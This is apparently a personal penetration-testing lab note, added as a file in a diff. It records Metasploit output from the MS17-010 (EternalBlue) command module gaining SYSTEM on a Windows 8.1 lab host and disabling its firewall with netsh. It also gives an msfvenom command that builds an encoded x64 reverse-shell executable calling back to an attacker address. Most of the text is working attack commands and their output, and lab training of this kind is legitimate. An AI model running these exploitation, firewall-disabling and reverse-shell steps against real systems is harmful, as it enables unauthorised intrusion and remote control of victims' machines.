@@ -1,0 +1,53 @@
+I disabled firewall:
+[*] 10.11.1.75:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
+msf5 auxiliary(admin/smb/ms17_010_command) > set COMMAND netsh advfirewall show currentprofile
+COMMAND => netsh advfirewall show currentprofile
+msf5 auxiliary(admin/smb/ms17_010_command) > run
+[*] 10.11.1.75:445 - Target OS: Windows 8.1 Enterprise 9600[*] 10.11.1.75:445 - Built a write-what-where primitive...
+[+] 10.11.1.75:445 - Overwrite complete... SYSTEM session obtained!
+[+] 10.11.1.75:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.11.1.75:445 - checking if the file is unlocked[*] 10.11.1.75:445 - Getting the command output...[*] 10.11.1.75:445 - Executing cleanup...
+[+] 10.11.1.75:445 - Cleanup was successful
+[+] 10.11.1.75:445 - Command completed successfully![*] 10.11.1.75:445 - Output for "netsh advfirewall show currentprofile":
+
+
+Public Profile Settings:
+----------------------------------------------------------------------
+State ON
+Firewall Policy AllowInbound,BlockOutbound
+LocalFirewallRules N/A (GPO-store only)
+LocalConSecRules N/A (GPO-store only)
+InboundUserNotification Disable
+RemoteManagement Disable
+UnicastResponseToMulticast Enable
+
+Logging:
+LogAllowedConnections Disable
+LogDroppedConnections Disable
+FileName %systemroot%\system32\LogFiles\Firewall\pfirewall. log
+MaxFileSize 4096
+
+Ok.
+
+
+[*] 10.11.1.75:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
+msf5 auxiliary(admin/smb/ms17_010_command) > set COMMAND NetSh Advfirewall set allprofiles state off
+COMMAND => NetSh Advfirewall set allprofiles state off
+msf5 auxiliary(admin/smb/ms17_010_command) > run
+[*] 10.11.1.75:445 - Target OS: Windows 8.1 Enterprise 9600[*] 10.11.1.75:445 - Built a write-what-where primitive...
+[+] 10.11.1.75:445 - Overwrite complete... SYSTEM session obtained!
+[+] 10.11.1.75:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.11.1.75:445 - checking if the file is unlocked[*] 10.11.1.75:445 - Getting the command output...[*] 10.11.1.75:445 - Executing cleanup...
+[+] 10.11.1.75:445 - Cleanup was successful
+[+] 10.11.1.75:445 - Command completed successfully![*] 10.11.1.75:445 - Output for "NetSh Advfirewall set allprofiles state off":
+
+Ok.
+
+And then and used the below command:
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp lhost=192.168.119.xxx lport=1234 -e x64/xor -i 5 -f exe -o expSMB.exe
+
+Try starting netlogon service if the above does not work.
+
+
+
+https://forums.offensive-security.com/private.php?do=showpm&pmid=425339
+
+
